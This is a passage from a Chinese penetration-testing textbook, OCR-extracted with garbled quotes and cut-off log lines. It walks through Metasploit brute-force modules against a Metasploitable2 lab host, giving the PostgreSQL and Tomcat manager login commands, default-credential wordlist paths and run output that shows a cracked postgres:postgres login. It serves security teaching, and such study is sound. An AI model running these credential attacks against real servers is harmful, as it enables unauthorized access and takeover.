yes
How fast to bruteforce,from 0 to 5
SPEED
DATABASE
template1
yes
The database to authenticate against
DB_ALL_CREDS
false
no
Try each user/password couple stored
in the current
database
DB_ALL_PASS
false
no
Add all passwords in the current
database to the list
DB_ALL_USERS
false
no
Add all users in the current database to
the list
PASSWORD
no
A specific password to authenticate
with
PASS_FILE
/opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt
no
File containing passwords,one per line
RETURN_ROWSET true
no
Set to true to see query result sets
RHOSTS
yes
The target address range or CIDR
identifier
RPORT
5432
yes
The target port
STOP_ON
false
yes
Stop guessing when a credential works
for a host
SUCCESS
THREADS
1
yes
The number of concurrent threads
USERNAME
postgres
no
A specific usermame to authenticate as
USERPASS_FILE
/opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt
no
File containing (space-seperated) users
and
passwords, one pair per line
USER_AS_PASS
true
ou
Try the username as the password for
all users
USER_FILE
/opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt
no
File containing users, one per line
VERBOSE
true
yes
Whether to print output for all attempts
以上信息显示了postgres_login模块中可配置的选项。根据用户的攻击情况，选择相应
选项进行配置。
（5）使用RHOST选项设置目标系统（本例中为Metasploitable2）。执行命令如下所示：
msf auxiliary(postgres_login) > set RHOSTS 192.168.41.142
RHOST => 192.168.41.142
· 167 ·
---
## Page 180
第2篇信息的收集及利用
（6）指定用户名文件。执行命令如下所示：
msf auxiliary(postgres_login) > set user_file /usr/share/metasploit- framework/data/wordlists/
postgres_default_user.txt
user_file =>/usr/share/metasploit-framework/data/wordlists /postgres_default_user.txt
（7）指定密码文件。执行命令如下所示：
msf auxiliary(postgres_login) > set pass_file /usr/share/metasploit- framework/data/wordlists/
postgres_default_pass.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/ postgres_default_pass.txt
（8）运行渗透攻击。执行命令如下所示：
msf auxiliary(postgres_login)>exploit
[] 192.168.41.142:5432 Postgres - [01/21] - Trying username:postgres' with password:" on
database “template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'postgres":"
[-] 192.168.41.142:5432 Postgres - [01/21] - Usermame/Password failed
[] 192.168.41.142:5432 Postgres - [02/21] - Trying username:" with password:" on database
'template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: ""
[-] 192.168.41.142:5432 Postgres - [02/21] - Usermame/Password failed.
'template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'scott':"
[-] 192.168.41.142:5432 Postgres - [03/21] - Usermame/Password failed.
]
database “template1’
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'admin':"
[-] 192.168.41.142:5432 Postgres - [04/21] - Usermame/Password failed.
password:'postgres'on database‘template1
[+] 192.168.41.142:5432 Postgres -Success:postgres:postgres (Database template1'
succeeded.)
[] 192.168.41.142:5432 Postgres - Disconnected
[] 192.168.41.142:5432 Postgres - [06/21] - Trying usermame:scott' with password:scott' on
database “template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'scott:'scott
[-] 192.168.41.142:5432 Postgres - [06/21] - Usermame/Password failed.
[] 192.168.41.142:5432 Postgres - [07/21] - Trying username:admin’ with password:radmin' on
database‘template1
[] 192.168.41.142:5432 Postgres - Invalid username or password: *scott:'admin'
[-] 192.168.41.142:5432 Postgres - [16/21] - Username/Password failed.
[]192.168.41.142:5432 Postgres - [17/21] - Trying username:admin’ with password:'tiger on
database “template1'
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'admin':'tiger
[-] 192.168.41.142:5432 Postgres - [17/21] - Username/Password failed.
database template1
[-] 192.168.41.142:5432 Postgres - Invalid username or password: 'admin':postgres
[-] 192.168.41.142:5432 Postgres - [18/21] - Usermame/Password failed.
·168 ·
---
## Page 181
第6章漏洞利用
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
以上输出的信息是PostgreSQL渗透攻击的一个过程。测试到PostgreSQL数据库服务
的用户名和密码分别是Postgres和Postgres。
6.4.3渗透攻击Tomcat服务
Tomcat服务器是一个免费的开放源代码的Web应用服务器。它可以运行在Linux和
Windows等多个平台上。由于其性能稳定、扩展性好和免费等特点深受广大用户的喜爱。
目前，互联网上绝大多数JavaWeb等应用都运行在Tomcat服务器上。Tomcat默认存在一
个管理后台，默认的管理地址是http:/IP或域名：端口/manager/html。通过此后台，可以在
不重启Tomcat服务的情况下方便地部署、启动、停止或卸载Web应用。但是如果配置不
当的话就存在很大的安全隐患。攻击者利用这个漏洞，可以非常快速、轻松地入侵一台服
务器。本小节将介绍渗透攻击Tomcat服务的方法。渗透攻击Tomcat服务的具体操作步骤
如下所示。
（1）启动MSFCONSOLE。执行命令如下所示：
root@kali:~# msfconsole
（2）搜索所有有效的Tomcat模块。执行命令如下所示：
msf > search tomcat
Matching Modules
Name
Disclosure Date
Rank
学
Description
auxiliary/admin/http/tomcat_administration
normal
Tomcat
Administration
Tool
Default Access
auxiliary/admin/http/tomcat_utf8_
normal
Tomcat UTF-8 Directory Traversal
Vulnerability
traversal
auxiliary/admin/http/trendmicro_dlp_
normal
TrendMicro Data Loss Prevention
5.5 Directory
traversal
Traversal
auxiliary/dos/http/apache_
2010-07-09
normal
Apache
Tomcat
Transfer-Encoding Information
tomcat_transfer_encoding
00:00:00UTC
Disclosure and DoS
auxiliary/dos/http/hashcollision_dos 2011-12-28
normal
Hashtable Collisions
00:00:00 UTC
auxiliary/scanner/http/tomcat_enum
normal
Apache Tomcat User Enumeration
auxiliary/scanner/http/tomcat_mgr_.
normal
Tomcat
Application
Manager
Login Utility
login
exploit/multi/http/struts_default
2013-07-02
excellent Apache
Struts
2
DefaultActionMapper Prefixes
action_mapper
00:00:00UTC
OGNL Code Execution
exploit/multi/http/tomcat_mgr
2009-11-09
excellent Apache
Tomcat
Manager
Application Deployer
deploy
00:00:00 UTC
Authenticated Code Execution
post/windows/gather/enum_tomcat
normal
Windows Gather Apache Tomcat
Enumeration
以上输出的信息显示了Tomcat服务的可用模块。现在用户可以选择易攻击的模块，
· 169 ·
---
## Page 182
第2篇信息的收集及利用
进行渗透攻击。
（3）使用Tomcat管理登录模块进行渗透攻击。执行命令如下所示：
msf auxiliary(postgres_login)>use auxiliary/scanner/http/ tomcat_mgr_login
（4）查看tomcat_mgr_login模块的有效选项。执行命令如下所示：
msf auxiliary(tomcat_mgr_login) > show options
Module options (auxiliary/scanner/http/tomcat_mgr_login):
Name
Current Setting
Required
Description
BLANK_PASSWORDS
true
no
Try blank passwords for all users
BRUTEFORCE_SPEED
5
yes
How fast to bruteforce, from 0 to 5
DB_ALL_CREDS
false
no
Try each user/password couple stored in the
current
database
DB_ALL_PASS
false
no
Add all passwords in the current database to
the list
DB_ALL_USERS
false
no
Add all users in the current database to the
list
PASSWORD
ou
A specific password to authenticate with
PASS_FILE
/opt/metasploit/apps/pro/msf3/data/wordlists/tomcat_mgr_default_pass.txt
no
File containing passwords, one per line
Proxies
no
Use a proxy chain
RHOSTS
yes
The target address range or CIDR identifier
RPORT
8080
yes
The target port
STOP_ON_SUCCESS
false
yes
Stop guessing when a credential works for a
host
THREADS
1
yes
The number of concurrent threads
URI
/manager/html
yes
URI
for
Manager
login.
Default
IS
/manager/html
USERNAME
ou
A specific username to authenticate as
USERPASS_FILE
/opt/metasploit/apps/pro/msf3/data/wordists/tomcat_mgr_default_userpass.txt
no
File
containing
passwords
separated by space,
one pair per line
USER_AS_PASS
true
no
Try the username as the password for all
users
USER_FILE
/opt/metasploit/apps/pro/msf3/data/wordlists/tomcat_mgr_default_users.txt
no
File containing users, one per line
VERBOSE
true
yes
Whether to print output for allattempts
VHOST
no
HTTP server virtual host
以上输出的信息显示了tomcat_mgr_login模块中有效的选项。此时用户可以选择相应
的模块，进行配置。
（5）设置PassFile选项。执行命令如下所示：
auxiliary(tomcat_mgr_login)
set
PASS_FILE
/usr/share/metasploit-
framework/data/wordlists/tomcat_mgr_default_pass.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
以上输出的信息显示了指定密码文件的绝对路径。
（6）设置User_File选项。执行命令如下所示：
msf
auxiliary(tomcat_mgr_login)
>
USER FILE
/usr/share/metasploit-
• 170 ·
---
## Page 183
第6章漏润利用
framework/data/wordlists/tomcat_mgr_default_users.txt
USER_FiLE =>/usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_users.txt
以上输出的信息显示了指定用户名文件的决定路径。
（7）使用RHOSTS选项设置目标系统（本例使用的是Metasploitable2）。执行命令如
下所示：
msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.41.142
RHOSTS => 192.168.41.142
输出的信息表示指定攻击的目标系统地址为192.168.41.142。
（8）设置RPORT选项为8180。执行命令如下所示：
msf auxiliary(tomcat_mgr_login)> set RPORT 8180
RPORT => 8180
以上信息设置了攻击目标系统的端口号为8180。
（9）运行渗透攻击。执行命令如下所示：
msf > exploit
[] 192.168.41.142:8180 TOMCAT_MGR - [01/63] - Trying username:" with password:"
[-] 192.168.41.142:8180 TOMCAT_MGR - [01/63] - /manager/html [Apache-Coyote/1.1] (Tomcat
Application Manager] failed to login as “
[] 192.168.41.142:8180 TOMCAT_MGR - [02/63] - Trying username:admin’ with password:
[-] 192.168.41.142:8180 TOMCAT_MGR - [02/63]  /manager/html [Apache-Coyote/1.1] [Tomcat
ApplicationManager]failed to login as'admin’
[*] 192.168.41.142:8180 TOMCAT_MGR - [12/63] - Trying usernamie:xampp' with password:
[-] 192.168.41.142:8180 TOMCAT_MGR - [12/63] - /manager/html [Apache-Coyote/1.1] [Tomcat
Application Manager] failed to login asxampp
[*]192.168.41.142:8180TOMCAT_MGR-[13/63]-Tryingusername:admin'with
password:'admin'
[-] 192.168.41.142:8180 TOMCAT_MGR - [13/63] - /manager/html [Apache-Coyote/1.1] [Tomcat
Application Manager] failed to login as 'admin'
[*]192.168.41.142:8180TOMCAT_MGR-[14/63]-Trying username:manager'with
password:'manager
[-] 192.168.41.142:8180 TOMCAT_MGR - [14/63] - /manager/html [Apache-Coyote/1.1] [Tomcat
Application Manager] failed to login as 'manager
[] 192.168.41.142:8180 TOMCAT_MGR - [15/63] - Trying username:role1′ with password:role1'
[-] 192.168.41.142:8180 TOMCAT_MGR - [15/63] - /manager/html [Apache-Coyote/1.1] [Tomcat